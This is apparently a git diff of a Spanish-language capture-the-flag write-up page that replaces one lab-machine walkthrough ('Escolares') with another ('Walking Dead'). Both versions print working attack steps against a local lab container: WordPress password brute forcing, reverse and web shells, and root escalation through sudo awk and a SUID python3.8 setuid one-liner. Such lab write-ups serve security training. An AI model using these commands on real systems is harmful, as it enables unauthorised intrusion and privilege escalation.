@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Escolares</title>
+    <title>Walking Dead</title>
     <link href="../style/estilo.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <link rel="stylesheet"
@@ -34,7 +34,7 @@
     <main class="max-w-4xl mx-auto px-6 py-12">
 
     <h1 class="text-4xl font-bold mb-2">🔹Maquina: Escolares</h1>
-    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 18/08/2025 | Categoría: LINUX </p>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 19/08/2025 | Categoría: LINUX </p>
 
     <section class="mb-8">
         <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
@@ -53,122 +53,95 @@
         <pre><code class="language-bash">
             sudo nmap -p- -open -O -sS -sC -min-rate 5000 -n -Pn 172.17.0.2
             
-            PORT   STATE SERVICE
+                PORT   STATE SERVICE
                 22/tcp open  ssh
                 | ssh-hostkey: 
-                |   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
-                |_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
+                |   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
+                |   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
+                |_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
                 80/tcp open  http
-                |_http-title: P\xC3\xA1gina Escolar Universitaria
+                |_http-title: The Walking Dead - CTF
         </code></pre>
 
         <p class="text-gray-300 mb-4">
-            al ver el purto 80 abirto entramos en la web y hacemos reconocimiento de los directorios, 
-            entre los muchos que hay nos importa este:
+            En el inicio vemos que el atributo href="hidden/.shell.php" es una redirección hacia ese recurso, 
+            es decir, si lo visitas manualmente en el navegador (http://172.17.0.2/hidden/.shell.php)
         </p>
 
-        <pre><code class="language-bash">
-            sudo dirb http://172.17.0.2/
+        <img src="../Assets/walking_dead/1_172.17.0.2.png" class="mb-4" alt="inicio">
 
-            ==> DIRECTORY: http://172.17.0.2/wordpress/wp-admin/ 
-        </code></pre>
 
         <p class="text-gray-300 mb-4">
-            Entonces observando la pagina en la seccion de profesores, vemos que hay un profe que es el admin,
-            con sus datos creamos un diccionario personalizado con cupp, lo siguiente es 
-            realizar fuerza bruta sobre el panel de login, yo por probar el panel de wp 
-            me di cuenta que el usuario era luisillo, pero la contraseña si la tuve que 
-            encontrar con fuerza bruta:
+            Al ver esto probamos si se puede usar como web shell
         </p>
 
-        <pre><code class="language-bash">
-            wpscan --url http://172.17.0.2/wordpress/ -U luisillo -P luis.txt --password-attack wp-login
-
-            Valid Combinations Found:
-            Username: luisillo, Password: Luis1981
-
-        </code></pre>
+        <img src="../Assets/walking_dead/2_shell-web.png" class="mb-4" alt="inicio">
 
         <p class="text-gray-300 mb-4">
-            Teniendo acceso a el panel de wordpres como admin subimos un archivo que nos devuelve una shell
-            creado con "https://www.revshells.com/", nos ponemos a la escucha y ya tenemos la reverse shell
+            Efectivamente, aprovechando esto nos devolvemos una shell 
+            pero la vovemos a url con burp suite:
         </p>
 
-        <pre><code class="language-bash">
-            www-data@5e73f6b95669:/$ ls
-            ls
-            bin
-            bin.usr-is-merged
-            boot
-            dev
-            etc
-            home
-            lib
-            lib.usr-is-merged
-            lib64
-            media
-            mnt
-            opt
-            proc
-            root
-            run
-            sbin
-            sbin.usr-is-merged
-            srv
-            sys
-            tmp
-            usr
-            var
-        </code></pre>
-
+        <img src="../Assets/walking_dead/3_burp-suit.png" class="mb-4" alt="inicio">
         
         <p class="text-gray-300 mb-4">
-            El pivoteo se realizo de la suiguiente manera:
+            Ya tenemos acceso:
         </p>
 
         <pre><code class="language-bash">
-            www-data@5e73f6b95669:/$ cd /home
-            cd /home
-            www-data@5e73f6b95669:/home$ ls
-            ls
-                luisillo
-                secret.txt
-                ubuntu
-            www-data@5e73f6b95669:/home$ cat secret.txt
-            cat secret.txt
-                luisillopasswordsecret
-            www-data@5e73f6b95669:/home$ su luisillo
-            su luisillo
-            Password: luisillopasswordsecret
-            whoami
-            luisillo
+            nc -lvnp 4444
+                listening on [any] 4444 ...
+                connect to [192.168.1.9] from (UNKNOWN) [172.17.0.2] 33564
+                bash: cannot set terminal process group (23): Inappropriate ioctl for device
+                bash: no job control in this shell
+                www-data@c2009a8a5c7c:/var/www/html/hidden$ ls
         </code></pre>
 
+        <p class="text-gray-300 mb-4">
+            Mejore la shell con:
+        </p>
+
+        <pre><code class="language-bash">
+            python3 -c 'import pty; pty.spawn("/bin/bash")'
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Luego verificamos los binarios SUID disponibles:
+        </p>
+
+        <pre><code class="language-bash">
+            find / -perm -4000 -type f 2>/dev/null
+
+                /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                /usr/lib/openssh/ssh-keysign
+                /usr/bin/gpasswd
+                /usr/bin/su
+                /usr/bin/man
+                /usr/bin/umount
+                /usr/bin/chfn
+                /usr/bin/newgrp
+                /usr/bin/passwd
+                /usr/bin/mount
+                /usr/bin/chsh
+                /usr/bin/python3.8
+                /usr/bin/sudo
+        </code></pre>
 
     <!-- Explotación / Resolución -->
     <section class="mb-8">
         <h2 class="text-2xl font-semibold mb-2">💣 Escalada de privilegios / Resolución</h2>
         <p class="text-gray-300 mb-4">
-            El usuario luisillo tenía permisos de sudo para ejecutar /usr/bin/awk sin contraseña:
+            Entre ellos encontramos /usr/bin/python3.8, 
+            lo cual permite ejecutar código con privilegios elevados. 
+            Aprovechamos esto para escalar a root:
         </p>
 
         <pre><code class="language-bash">
-            sudo -l
-            Matching Defaults entries for luisillo on 5e73f6b95669:
-                env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
-
-            User luisillo may run the following commands on 5e73f6b95669:
-                (ALL) NOPASSWD: /usr/bin/awk
+        /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
         </code></pre>
 
         <p class="text-gray-300 mb-4">
-            Como awk permite ejecutar comandos del sistema mediante system(), se abusó de esto con:
-        </p>
-        <pre><code class="language-bash">
-            sudo awk 'BEGIN {system("/bin/sh")}'
-        </code></pre>
-        <p class="text-gray-300 mb-4">
-            Esto abrió una shell como root. Al verificar con whoami, se confirmó la escalada de privilegios.
+            Listo:
         </p>
 
         <pre><code class="language-bash">
